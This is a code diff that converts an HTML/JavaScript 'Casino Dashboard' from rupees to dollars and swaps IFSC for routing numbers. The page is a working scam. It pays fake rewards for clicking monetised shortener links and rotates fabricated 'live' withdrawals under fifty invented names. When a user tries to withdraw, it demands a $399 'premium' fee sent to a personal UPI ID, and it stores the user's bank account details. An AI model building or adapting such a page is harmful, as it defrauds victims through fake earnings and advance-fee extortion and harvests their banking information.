@@ -3,6 +3,7 @@
 <head>
   <meta charset="UTF-8"/>
   <meta name="viewport" content="width=device-width, initial-scale=1"/>
+
   <title>Casino Dashboard</title>
   <style>
     /* Your original CSS unchanged */
@@ -69,7 +70,7 @@
       <div class="user-info">
         <label class="avatar-small">
           <input type="file" id="avatarUpload" accept="image/*" style="display:none" />
-          <img id="userAvatar" src="" alt="avatar" />
+          <img id="userAvatar" src="" alt="User avatar" />
         </label>
         <div class="user-text">
           <div class="name" id="displayUsername"></div>
@@ -80,9 +81,9 @@
     </header>
 
     <div class="kpi-bar">
-      <div class="kpi"><h3 id="balanceDisplay">₹0</h3><p>Balance</p></div>
+      <div class="kpi"><h3 id="balanceDisplay">$0</h3><p>Balance</p></div>
       <div class="kpi"><h3 id="kpiTasks">0</h3><p>Tasks Done</p></div>
-      <div class="kpi"><h3 id="kpiWeekly">₹0</h3><p>Weekly Win</p></div>
+      <div class="kpi"><h3 id="kpiWeekly">$0</h3><p>Weekly Win</p></div>
     </div>
 
     <nav class="tabs">
@@ -91,7 +92,7 @@
       <button data-tab="instructions">Instructions</button>
     </nav>
 
-    <div class="live-feed">🎉 Ravi just withdraws ₹500!</div>
+    <div class="live-feed">🎉 Ravi just withdraws $500!</div>
     <ul id="task-list" class="task-list"></ul>
   </div>
 
@@ -103,8 +104,8 @@
         <input type="number" id="withdrawAmount" placeholder="Amount" min="2000"/>
         <input type="text" id="accName" placeholder="Account Holder Name"/>
         <input type="text" id="accNumber" placeholder="Account Number"/>
-        <input type="text" id="ifsc" placeholder="IFSC Code"/>
-        <div id="withdrawError" class="withdraw-error">Minimum withdrawal is ₹2,000</div>
+        <input type="text" id="ifsc" placeholder="Routing Number"/>
+        <div id="withdrawError" class="withdraw-error">Minimum withdrawal is $2,000</div>
         <button id="withdrawSubmit">Withdraw</button>
       </div>
     </div>
@@ -113,18 +114,18 @@
   <script>
     const tasks = {
       daily: [
-        { key: 'daily_task_0', title: '🎲 Task 1', meta: 'Earn ₹12', reward: 12, color: 'var(--accent-gold)', url: 'https://gplinks.co/u8YjR' },
-        { key: 'daily_task_1', title: '🎲 Task 2', meta: 'Earn ₹13', reward: 13, color: 'var(--accent-gold)', url: 'https://gplinks.co/daoZXJS' },
-        { key: 'daily_task_2', title: '🎲 Task 3', meta: 'Earn ₹14', reward: 14, color: 'var(--accent-gold)', url: 'https://gplinks.co/MyUu8' },
-        { key: 'daily_task_3', title: '🎲 Task 4', meta: 'Earn ₹15', reward: 15, color: 'var(--accent-gold)', url: 'https://gplinks.co/vwBE8UJ' },
-        { key: 'daily_task_4', title: '🎲 Task 5', meta: 'Earn ₹16', reward: 16, color: 'var(--accent-gold)', url: 'https://gplinks.co/tpxgBwr' },
-        { key: 'daily_task_5', title: '🎲 Task 6', meta: 'Earn ₹17', reward: 17, color: 'var(--accent-gold)', url: 'https://gplinks.co/vuL15RO' }
+        { key: 'daily_task_0', title: '🎲 Task 1', meta: 'Earn $12', reward: 12, color: 'var(--accent-gold)', url: 'https://gplinks.co/u8YjR' },
+        { key: 'daily_task_1', title: '🎲 Task 2', meta: 'Earn $13', reward: 13, color: 'var(--accent-gold)', url: 'https://gplinks.co/daoZXJS' },
+        { key: 'daily_task_2', title: '🎲 Task 3', meta: 'Earn $14', reward: 14, color: 'var(--accent-gold)', url: 'https://gplinks.co/MyUu8' },
+        { key: 'daily_task_3', title: '🎲 Task 4', meta: 'Earn $15', reward: 15, color: 'var(--accent-gold)', url: 'https://gplinks.co/vwBE8UJ' },
+        { key: 'daily_task_4', title: '🎲 Task 5', meta: 'Earn $16', reward: 16, color: 'var(--accent-gold)', url: 'https://gplinks.co/tpxgBwr' },
+        { key: 'daily_task_5', title: '🎲 Task 6', meta: 'Earn $17', reward: 17, color: 'var(--accent-gold)', url: 'https://gplinks.co/vuL15RO' }
       ],
       weekly: [
-        { key: 'weekly_task_0', title: '🏆 Mission 1', meta: 'Earn ₹15', reward: 15, color: 'var(--accent-blue)', url: 'https://gplinks.co/aG4wyN' },
-        { key: 'weekly_task_1', title: '🏆 Mission 2', meta: 'Earn ₹15', reward: 15, color: 'var(--accent-blue)', url: 'https://gplinks.co/xtYbL7' },
-        { key: 'weekly_task_2', title: '🏆 Mission 3', meta: 'Earn ₹15', reward: 15, color: 'var(--accent-blue)', url: 'https://gplinks.co/I8XK8U' },
-        { key: 'weekly_task_3', title: '🏆 Mission 4', meta: 'Earn ₹15', reward: 15, color: 'var(--accent-blue)', url: 'https://gplinks.co/HBLM6r' }
+        { key: 'weekly_task_0', title: '🏆 Mission 1', meta: 'Earn $15', reward: 15, color: 'var(--accent-blue)', url: 'https://gplinks.co/aG4wyN' },
+        { key: 'weekly_task_1', title: '🏆 Mission 2', meta: 'Earn $15', reward: 15, color: 'var(--accent-blue)', url: 'https://gplinks.co/xtYbL7' },
+        { key: 'weekly_task_2', title: '🏆 Mission 3', meta: 'Earn $15', reward: 15, color: 'var(--accent-blue)', url: 'https://gplinks.co/I8XK8U' },
+        { key: 'weekly_task_3', title: '🏆 Mission 4', meta: 'Earn $15', reward: 15, color: 'var(--accent-blue)', url: 'https://gplinks.co/HBLM6r' }
       ],
       monthly: []
     };
@@ -155,9 +156,9 @@
 
     function updateKPI() {
       const s = JSON.parse(localStorage.getItem('casinoUser'));
-      document.getElementById('balanceDisplay').textContent = `₹${s.balance}`;
+      document.getElementById('balanceDisplay').textContent = `$${s.balance}`;
       document.getElementById('kpiTasks').textContent = s.tasksDone;
-      document.getElementById('kpiWeekly').textContent = `₹${s.weeklyWin}`;
+      document.getElementById('kpiWeekly').textContent = `$${s.weeklyWin}`;
     }
 
     function renderTasks(tab) {
@@ -271,25 +272,26 @@
       const saved = JSON.parse(localStorage.getItem('casinoUser'));
       if (amt > saved.balance) { alert('Insufficient balance'); return; }
       if (saved.balance === 2000 && amt >= 2000) {
-        alert("To withdraw please go through these instructions:\\n\\nTo withdraw you need to get premium. Your level is VIP 0.\\nPlease pay ₹399 to get premium and withdraw your cash without verification or any hustle.\\n\\nUPI: sahilzeerak123@okhdfcbank");
+        alert("To withdraw please go through these instructions:\n\nTo withdraw you need to get premium. Your level is VIP 0.\nPlease pay $399 to get premium and withdraw your cash without verification or any hustle.\n\nUPI: sahilzeerak123@okhdfcbank");
         return;
       }
       ['accName','accNumber','ifsc'].forEach(id => localStorage.setItem(id, document.getElementById(id).value.trim()));
       saved.balance -= amt;
       localStorage.setItem('casinoUser', JSON.stringify(saved));
       updateKPI();
-      alert(`₹${amt} withdrawn successfully`);
+      alert(`$${amt} withdrawn successfully`);
       modal.style.display = 'none';
     };
   </script>
-  <!-- Rotating Live‑Feed (50 names, ₹2k–₹4k) -->
+
+  <!-- Rotating Live‑Feed (50 names, $2k–$4k) -->
   <script>
     (function() {
       const names = ['Arjun','Vihaan','Rohan','Aarav','Kabir','Advait','Ishaan','Krishna','Ritik','Neel','Shaurya','Vivaan','Atharv','Ayaan','Reyansh','Kunal','Darsh','Sahil','Yash','Ansh','Diya','Aanya','Ira','Anika','Meera','Kiara','Saanvi','Riya','Tara','Mira','Sara','Anaya','Aadhya','Kavya','Nisha','Jiya','Shreya','Pallavi','Aditi','Lavya','Tanvi','Radhika','Naina','Pooja','Priya','Neha','Sneha','Sanya','Bhavya','Tanya'];
       function randInt(min,max){ return Math.floor(Math.random()*(max-min+1))+min; }
       const msgs = names.map(n => {
         const amt = Math.random()<0.7 ? randInt(2000,3000) : randInt(3001,4000);
-        return `🎉 ${n} withdraws ₹${amt}!`;
+        return `🎉 ${n} withdraws $${amt}!`;
       });
       let i=0;
       setInterval(()=>{
